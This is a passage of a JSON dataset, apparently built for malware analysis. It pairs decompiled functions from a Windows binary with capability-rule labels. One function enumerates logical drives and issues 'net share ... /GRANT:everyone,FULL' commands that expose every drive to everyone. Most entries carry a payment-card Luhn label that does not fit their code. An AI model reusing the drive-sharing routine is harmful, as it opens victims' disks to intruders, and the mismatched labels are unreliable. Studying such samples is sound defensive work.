            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ce0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint var_4h;\n    \n    puVar1 = fcn.00401300(4, arg_ch);\n    puVar2 = fcn.00401440(arg_10h);\n    *puVar1 = *puVar2;\n    return;\n}\n",
        "token_count": 98
    },
    "00408d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00408d80(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.00409a10(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "00408db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408db0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.004075c0(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.004075c0(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 632
    },
    "00408f70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408f70(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        if (arg_8h == arg_ch) {\n            return 1;\n        }\n        if (0xff < *arg_8h) break;\n        var_4h._0_1_ = *arg_8h;\n        *(in_ECX + var_4h) = 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 154
    },
    "00409120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409120(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint var_4h;\n    \n    arg_14h = fcn.00404960();\n    fcn.00409a50(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 85
    },
    "00409150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00409150(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404960();\n    var_8h = fcn.00409600(uVar1);\n    var_ch = fcn.004012f0();\n    puVar2 = fcn.00407940(&var_ch, &var_8h);\n    return *puVar2;\n}\n",
        "token_count": 113
    },
    "004091c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004091c0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00409af0(arg_8h);\n    fcn.00408d10(arg_8h_00);\n    return;\n}\n",
        "token_count": 74
    },
    "00409350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409350(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_10h + 1);\n    return;\n}\n",
        "token_count": 64
    },
    "00409380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409380(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00407260(arg_ch);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.004096d0(arg_8h, arg_ch, uVar1);\n    return;\n}\n",
        "token_count": 88
    },
    "004093c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004093c0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00407260(arg_8h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00407510(arg_8h, uVar1);\n    return;\n}\n",
        "token_count": 83
    },
    "00409530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409530(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_10h + 1);\n    return;\n}\n",
        "token_count": 64
    },
    "00409580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409580(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00401340(arg_ch);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.00405350(arg_8h, arg_ch, uVar1);\n    return;\n}\n",
        "token_count": 87
    },
    "00409610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409610(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_14h;\n    uint var_4h;\n    \n    arg_14h = fcn.00404960();\n    fcn.00409a50(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 85
    },
    "004096d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004096d0(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t arg_ch_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    iVar2 = fcn.00404960();\n    fcn.00406270(arg_8h);\n    iVar1 = *(iVar2 + 0x10);\n    if (*(iVar2 + 0x14) - iVar1 < arg_10h) {\n        in_ECX = fcn.00409da0(arg_10h, 0, arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        *(iVar2 + 0x10) = iVar1 + arg_10h;\n        iVar2 = fcn.00406170();\n        arg_ch_00 = iVar2 + arg_8h * 2;\n        if ((arg_ch_00 < arg_ch + arg_10h * 2) && (arg_ch <= iVar2 + iVar1 * 2)) {\n            if (arg_ch < arg_ch_00) {\n                var_ch = arg_ch_00 - arg_ch >> 1;\n            }\n            else {\n                var_ch = 0;\n            }\n        }\n        else {\n            var_ch = arg_10h;\n        }\n        fcn.00407750(arg_ch_00 + arg_10h * 2, arg_ch_00, (iVar1 - arg_8h) + 1);\n        fcn.00407240(arg_ch_00, arg_ch, var_ch);\n        fcn.00407240(arg_ch_00 + var_ch * 2, arg_ch + arg_10h * 2 + var_ch * 2, arg_10h - var_ch);\n    }\n    return in_ECX;\n}\n",
        "token_count": 470
    },
    "00409800": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00409800(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint var_4h;\n    \n    fcn.00407240(arg_8h, arg_ch, arg_14h);\n    fcn.00407240(arg_8h + arg_14h * 2, arg_18h, arg_1ch);\n    fcn.00407240(arg_8h + arg_14h * 2 + arg_1ch * 2, arg_ch + arg_14h * 2, (arg_10h - arg_14h) + 1);\n    return;\n}\n",
        "token_count": 171
    },
    "00409930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409930(uint noname_0, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401440(arg_ch);\n    fcn.00408fc0();\n    return in_ECX;\n}\n",
        "token_count": 61
    },
    "00409960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409960(uint noname_0, uint arg_ch)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00401440(arg_ch);\n    fcn.004091f0();\n    return in_ECX;\n}\n",
        "token_count": 61
    },
    "00409a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409a10(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    \n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x18) {\n        arg_ch_00 = fcn.00401440(arg_8h);\n        fcn.00409f10(arg_10h, arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "00409a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409a50(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint extraout_ECX;\n    uint arg_8h_00;\n    uint var_14h;\n    uchar var_eh;\n    uchar var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    var_ch = fcn.00401440(arg_8h);\n    uVar1 = fcn.00401440(arg_ch);\n    var_8h = fcn.00401440(arg_10h);\n    var_dh = fcn.00409f20(&var_ch, &var_8h);\n    arg_8h_00 = extraout_ECX;\n    fcn.00409fe0(&var_eh);\n    uVar1 = fcn.00409f30(var_ch, uVar1, var_8h, arg_14h);\n    fcn.00409ff0(&arg_10h, uVar1);\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 278
    },
    "00409b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409b20(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h;\n    int32_t arg_10h_00;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_00 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_00 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_00 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_00 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.00409350(arg_8h_00, arg_ch_00, arg_10h_00);\n        arg_10h = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00409350(arg_8h_00, uVar5, arg_10h_00);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 592
    },
    "00409c60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c60(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h;\n    int32_t arg_10h_00;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_00 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_00 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_00 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_00 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.00409530(arg_8h_00, arg_ch_00, arg_10h_00);\n        arg_10h = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00409530(arg_8h_00, uVar5, arg_10h_00);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 596
    },
    "00409da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409da0(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.00407890();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409230(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 8) {\n        fcn.00409800(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h, arg_14h, arg_18h);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.00409800(arg_8h_00, uVar5, arg_10h_01, arg_10h, arg_14h, arg_18h);\n        fcn.00407710(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 646
    },
    "00409ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409ef0(uint arg_8h, uint arg_ch, uint16_t *arg_10h)\n\n{\n    fcn.00401230(arg_8h, *arg_10h, arg_ch);\n    return;\n}\n",
        "token_count": 56
    },
    "00409f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409f30(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470588;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401b10(0xc);\n    fcn.0040a0b0(arg_10h, arg_14h);\n    var_4h = 0;\n    for (; arg_8h != arg_ch; arg_8h = arg_8h + 0x18) {\n        arg_8h_00 = fcn.00401440(arg_8h);\n        fcn.0040a0e0(arg_8h_00);\n    }\n    fcn.0040a030();\n    var_4h = 0xffffffff;\n    fcn.0040a050();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_14h);\n    return;\n}\n",
        "token_count": 300
    },
    "0040a050": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a050(uint *param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00408d80(*param_1, param_1[1], param_1[2]);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 131
    },
    "0040a0e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0e0(uint arg_8h)\n\n{\n    uint arg_10h;\n    uint arg_ch;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    arg_10h = fcn.00401440(arg_8h);\n    arg_ch = fcn.00401440(*(in_ECX + 4));\n    fcn.00407d80(*(in_ECX + 8), arg_ch, arg_10h);\n    *(in_ECX + 4) = *(in_ECX + 4) + 0x18;\n    return;\n}\n",
        "token_count": 135
    },
    "0040a1d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040a1d0(uint arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    *in_ECX = arg_8h;\n    fcn.00405810(arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 144
    },
    "0040a230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040a230(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004055f0(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "0040ad60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ad60(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.004013f0(arg_8h, arg_ch, arg_10h & 0xff);\n    var_1h._0_1_ = 0;\n    fcn.00401410(arg_8h + arg_ch, &var_1h);\n    return;\n}\n",
        "token_count": 139
    },
    "0040ada0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ada0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470508;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405100(var_10h);\n    var_4h = 0;\n    iVar1 = fcn.00404d90();\n    iVar2 = fcn.00407260(arg_10h);\n    arg_8h_00 = fcn.00401440(iVar1 + iVar2);\n    fcn.004092c0(arg_8h_00);\n    fcn.004093f0(arg_ch);\n    fcn.0040af70(arg_10h);\n    fcn.00405010(&var_28h);\n    var_4h = 0xffffffff;\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_ch);\n    return;\n}\n",
        "token_count": 329
    },
    "0040ae70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ae70(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    uint32_t uVar2;\n    uint noname_0;\n    uint uVar3;\n    uint *arg_10h_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.004069e0();\n    if (uVar1 < arg_8h) {\n        fcn.00409220();\n    }\n    arg_8h_00 = fcn.00404960();\n    uVar1 = arg_8h_00[5];\n    uVar2 = fcn.00409410(arg_8h);\n    noname_0 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar2) | uVar2 + 1);\n    fcn.00401420();\n    arg_8h_00[4] = arg_8h;\n    arg_8h_00[5] = uVar2;\n    arg_10h = arg_10h & 0xff;\n    uVar3 = fcn.00401440(var_8h);\n    fcn.0040ad60(uVar3, arg_8h, arg_10h);\n    if (uVar1 < 0x10) {\n        arg_10h_00 = &var_8h;\n        uVar3 = fcn.00401440(arg_8h_00);\n        fcn.00408ce0(noname_0, uVar3, arg_10h_00);\n    }\n    else {\n        uVar3 = *arg_8h_00;\n        fcn.00407200(uVar3, uVar1 + 1);\n        *arg_8h_00 = var_8h;\n    }\n    fcn.0043a2e7(uVar3);\n    return;\n}\n",
        "token_count": 505
    },
    "0040af90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get disk information"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040af90(uint arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_f4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint32_t var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uchar var_aeh;\n    uint32_t var_adh;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470610;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_adh._0_1_ = 0;\n    var_aeh = 0;\n    arg_8h_00 = 0xc;\n    var_10h = uVar2;\n    fcn.00401b10(0xc);\n    fcn.00404a90(arg_8h_00, uVar2);\n    fcn.00452000(&var_a4h, 0, 0x44);\n    var_60h = 0;\n    var_5ch = 0;\n    var_58h = 0;\n    var_54h = 0;\n    var_c0h = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    for (stack0xffffff50 = 0; stack0xffffff50 < 0x1a; *0x4 = stack0xffffff50 + 1) {\n        var_a8h._0_2_ = var_adh._1_2_ + 0x41;\n        fcn.0040b230(&var_50h, var_a8h);\n        fcn.00407620(&var_50h);\n        cVar1 = fcn.00404d10();\n        if (cVar1 == '\\0') {\n            uVar3 = fcn.00401440(&var_50h);\n            fcn.004037a0(uVar3);\n        }\n        else if ((1 << (stack0xffffff50 & 0x1f) & var_c0h) != 0) {\n            var_b4h._0_2_ = var_a8h;\n            puVar4 = fcn.0040b410(&var_b4h, &var_b4h + 2);\n            fcn.0040b4f0(*puVar4);\n            fcn.0040af70(0x485a64);\n            uVar3 = fcn.00401440(&var_50h);\n            fcn.004037a0(uVar3);\n            fcn.0040b4a0(L\"net share \");\n            var_b8h._0_2_ = var_a8h;\n            puVar4 = fcn.0040b410(&var_b8h, &var_b8h + 2);\n            fcn.0040b4c0(*puVar4);\n            fcn.0040af70(L\"AKOSHARE=\");\n            var_bch._0_2_ = var_a8h;\n            puVar4 = fcn.0040b410(&var_bch, &var_bch + 2);\n            fcn.0040b4c0(*puVar4);\n            fcn.0040af70(0x485a98);\n            fcn.0040af70(L\" \\\"/GRANT:everyone,FULL\\\"\");\n            uVar3 = fcn.00404db0();\n            fcn.00405090(uVar3);\n            fcn.0040b360(&var_f4h);\n            fcn.00404f30();\n        }\n        fcn.00404f30();\n        fcn.00404f30();\n    }\n    uVar3 = fcn.00401440(&var_20h);\n    fcn.00404a10(uVar3);\n    fcn.004049d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 1039
    },
    "0040b230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b230(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    ushort *arg_14h;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    ushort var_36h;\n    uint var_34h;\n    uint var_30h;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470640;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_14h._0_2_ = 0;\n    var_18h = CONCAT22(0x3a, arg_ch);\n    var_34h = 0x104;\n    uVar6 = 0;\n    uVar5 = 0x104;\n    var_10h = uVar1;\n    fcn.0040b520(0x104, 0);\n    puVar3 = 